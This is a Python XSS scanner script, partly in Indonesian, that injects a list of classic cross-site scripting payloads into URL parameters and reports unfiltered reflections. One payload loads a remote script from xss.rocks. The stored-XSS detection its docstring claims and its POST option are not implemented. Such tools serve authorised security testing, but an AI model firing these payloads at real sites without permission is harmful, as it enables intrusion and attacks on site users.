#!/usr/bin/env python3
"""
XSS Scanner - Reflected and Stored XSS detection
Menguji parameter URL untuk kerentanan Cross-Site Scripting.
Usage: python xss_scanner.py -u "http://target.com/search?q=test"
"""
import requests
import argparse
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote


XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "javascript:alert('XSS')",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=`javascript:alert(\"XSS\")`>",
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "'';!--\"<XSS>=&{()}",
    "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
    "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
]


def normalize_url(url):
    parsed = urlparse(url)
    if not parsed.scheme:
        url = "http://" + url
        parsed = urlparse(url)
    return url, parsed


def get_params(url):
    return parse_qs(urlparse(url).query)


def inject_params(url, params):
    parsed = urlparse(url)
    query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=query))


def is_reflected(response_text, payload):
    """Check if payload appears unfiltered in response"""
    if payload in response_text:
        return True
    # Check URL-decoded version
    decoded = payload.replace("&quot;", "\"").replace("&amp;", "&")
    if decoded in response_text:
        return True
    return False


def test_reflected_xss(session, url, params):
    findings = []
    for param_name in params:
        original = params[param_name][0] if params[param_name] else "test"
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = original + payload
            test_url = inject_params(url, test_params)
            try:
                r = session.get(test_url, timeout=10)
                if is_reflected(r.text, payload):
                    findings.append({
                        "type": "Reflected XSS",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                    })
                    return findings
            except requests.exceptions.RequestException:
                continue
    return findings


def check_security_headers(headers):
    issues = []
    required = {
        "X-Frame-Options": "Clickjacking protection missing",
        "X-Content-Type-Options": "MIME-sniffing protection missing",
        "Content-Security-Policy": "CSP header missing",
        "Strict-Transport-Security": "HSTS not enabled",
    }
    for header, msg in required.items():
        if header not in headers:
            issues.append(f"[!] {msg} ({header})")
    return issues


def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL with parameters")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--check-headers", action="store_true", help="Check security headers")
    args = parser.parse_args()

    url, parsed = normalize_url(args.url)
    params = get_params(url)

    if not params:
        print("[!] URL tidak memiliki parameter. Contoh: http://target.com/search?q=test")
        sys.exit(1)

    print(f"[*] Target: {url}")
    print(f"[*] Parameters: {list(params.keys())}")
    print(f"[*] Method: {args.method}")
    print("-" * 60)

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 Security-Scanner"})

    # Check base response
    try:
        r = session.get(url, timeout=10)
        print(f"[*] Base response: {r.status_code} (size: {len(r.text)} bytes)")

        if args.check_headers:
            print("\n[*] Security Headers Check:")
            issues = check_security_headers(r.headers)
            if issues:
                for issue in issues:
                    print(f"    {issue}")
            else:
                print("    [+] All security headers present")
    except requests.exceptions.RequestException as e:
        print(f"[!] Tidak dapat terhubung: {e}")
        sys.exit(1)

    print("\n[*] Testing Reflected XSS...")
    findings = test_reflected_xss(session, url, params)
    if findings:
        for f in findings:
            print(f"\n[!] VULNERABLE - {f['type']}")
            print(f"    URL: {f['url']}")
            print(f"    Parameter: {f['parameter']}")
            print(f"    Payload: {f['payload']}")
    else:
        print("[*] Tidak ada reflected XSS terdeteksi dengan payload standar")

    print("-" * 60)
    print("[*] Selesai.")


if __name__ == "__main__":
    main()

